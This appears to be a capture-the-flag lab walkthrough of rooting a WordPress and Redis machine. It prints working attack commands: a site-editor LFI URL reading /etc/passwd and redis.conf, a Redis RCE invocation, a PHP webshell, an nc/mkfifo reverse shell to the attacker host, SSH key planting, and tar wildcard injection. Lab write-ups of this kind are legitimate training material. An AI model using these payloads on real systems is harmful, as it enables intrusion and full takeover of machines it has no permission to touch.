Since the web application is running WordPress, I used the tool wpscan. Before checking the users, I checked the plugins first. The command I used to enumerate the plugins is wpscan --url http://192.168.205.166 --enumerate ap --plugins-detection aggressive. Then I obtained the result shown in the output above. Right away, I notice the plugin by the name site-editor. This plugin version is 1.1.1. From previous experience, I know this plugin is vulnerable to Local File Inclusion (LFI).


As shown in the image above, the plugin site-editor is vulnerable to LFI. This exploit can be grabbed from here. The PoC is simple:

http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd


To test the exploit, I attempted to read the /etc/passwd file on the target machine using the command http://192.168.205.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd and got a hit as shown in the image above. I notice there is a user created account called alice on the target machine. I attempted to read the SSH key of this user, but I had no luck. I checked to see if I can poison any log files using the command ffuf -u 'http://192.168.205.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=FUZZ' -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fw 6, but I had no luck.

Port 6379: Redis

I connected to the redis application on the target machine using the command redis-cli -h 192.168.205.166, but it asked for authentication. Usually the configuration file of the redis application is located at /etc/redis/ with the name redis.conf.


Using the LFI exploit, I browsed to view-source:http://192.168.205.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf and obtained the configuration file of the redis application on the target machine. This file contains the password Ready4Redis? at line 507, as shown in the picture above.

Exploitation

Owning the Redis Application via Redis RCE


I connected to the redis application on the target machine again using the command redis-cli -h 192.168.205.166. To authenticate, I used the command AUTH Ready4Redis?. And bingo! I gained access to the application, as I was able to run the command info. Running the info command output the application version is 5.0.14. This is vulnerable to Redis RCE. I cloned this) GitHub project on my machine. Time to run it :)


After setting up the exploit, I opened two terminals as shown in the image above. The top terminal is where I deploy the exploit. The bottom terminal is where I catch the reverse shell connection. I started a listener on my machine at port 80. Then on the top terminal, I deployed the command python3 redis-rce.py -r 192.168.205.166 -L 192.168.45.167 -f exp.so -P 80 -a 'Ready4Redis?' to run the exploit. This ran successfully, and I picked the r mode for Reverse Shell. Then I just input the IP of my attack host, and the port 80. After pressing Enter, I instantly obtained a reverse shell connection on my machine at port 80 as shown in the picture above. Now I have a foothold on the target machine as the user redis. I upgraded my shell to a TTY one using the pty module offered by Python. To achieve this, I ran the command python3 -c 'import pty; pty.spawn("/bin/bash");'.

Privilege Escalation

After obtaining a shell on the target machine as the user redis, I notice the access is very limited. I am not able to browse to /home, I cannot execute linpeas, etc. After enumerating for some time, I checked the redis.service file located at /etc/systemd/system. And I notice this file is writable as the current user. Checking the content of the file output the following result:

From the output above, I find the following line the most interesting:

ReadWriteDirectories=-/opt/redis-files

To elevate my privileges on the target machine, can I place a malicious PHP file here? Can I upload a PHP webshell inside this directory, and access it using the LFI exploit? I browsed into this directory using the command cd /opt/redis-files. Then I created a simple PHP webshell using the command echo '<?php echo system($_GET["cmd"]); ?>' > shell.php by the name shell.php.


To access my PHP webshell, I browsed to http://192.168.205.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/shell.php&cmd=id. And bingo! As shown in the image above, the application execution context is under alice. I also achieved Remote Code Execution as now I am able to issue commands as the user alice. Time to obtain a reverse shell connection :)


I started a listener on my machine at port 8443. Then using my PHP webshell, I deployed a reverse shell connection command. The full URL with the reverse shell command is http://192.168.205.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/shell.php&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fbash%20-i%202%3E%261|nc%20192.168.45.167%208443%20%3E%2Ftmp%2Ff. And right away, I obtained a reverse shell connection on my machine at port 8443 with the session as alice, as shown in the picture above on the bottom terminal. But this shell is not stable. Since SSH is already open on the target machine on port 22, I can abuse this.


I generated a new SSH keypair using the command ssh-kegen on my machine. The file name I saved it as is alice. Then I changed the permission of alice file using the command chmod 400 alice. The content of alice.pub is also shown in the image above. The content of alice.pub will replace the authorized_keys file at /home/alice/.ssh/authorized_keys.


Using the new shell access as the user alice from the PHP webshell, I ran the command mkdir .ssh at /home/alice/ directory. Then I browsed into this new directory using the command cd .ssh. Afterwards, I ran the command echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHNRhdNNcMKvjL1s4qaY1PamW/3Rw21wSpFK3bviWjBS kali@kali' > authorized_keys to replace my new SSH key.


On my machine, I executed the command ssh alice@192.168.205.166 -i alice to SSH into the target machine using the new SSH key. And bingo. I now have a stable foothold on the target machine as the user alice, as shown in the picture above.

Vertical Privilege Escalation: User alice to User root via tar Wildcard Injection

During manual enumeration as the user redis with low privilege shell, I noticed the crontjob backup.sh located at /usr/local/bin. This can be checked using the command cat /etc/crontab, as shown in the picture above. This cronjob just performs a backup of the /var/www/html directory every three minutes, if a change is detected in the files or sub-directories. If a change is detected, the content is backed up using tar. This is where the vulnerability lies, as it is vulnerable to Wildcard Injection. Using special commands, it is possible to create special files that are used as flags to perform command injection to execute a script. This privilege escalation vector is explain more here.


On my machine, I created a new SSH keypair using the command ssh-keygen. This will be the root SSH key. I also changed the permission of the root key using the command chmod 400 root. Then I issued the following commands at /var/www/html directory using the SSH foothold as the user alice on the target machine:

echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKu5lHkx2lrmnO+FkXfYSrBNgXXgpswjEbT3+wCPV+Bx kali@kali' > /root/.ssh/authorized_keys
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKu5lHkx2lrmnO+FkXfYSrBNgXXgpswjEbT3+wCPV+Bx kali@kali' > /root/.ssh/authorized_keys

I also ran the command chmod +x privesc.sh to make it executable. This command injection leads to privesc.sh script being executed. And this script contains the command echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKu5lHkx2lrmnO+FkXfYSrBNgXXgpswjEbT3+wCPV+Bx kali@kali' > /root/.ssh/authorized_keys to save my SSH key inside the authorized_keys file located at /root/.ssh/. The cronjob is executed as root.


After waiting for three minutes, I ran the command ssh root@192.168.205.166 -i root to connect to the target machine via SSH as the user root. And bingo. As shown in the image above, now I have a root shell on the target machine :) Now I have root level access on the target machine.

Flags


The two flags, proof.txt and local.txt, are shown in the image above.
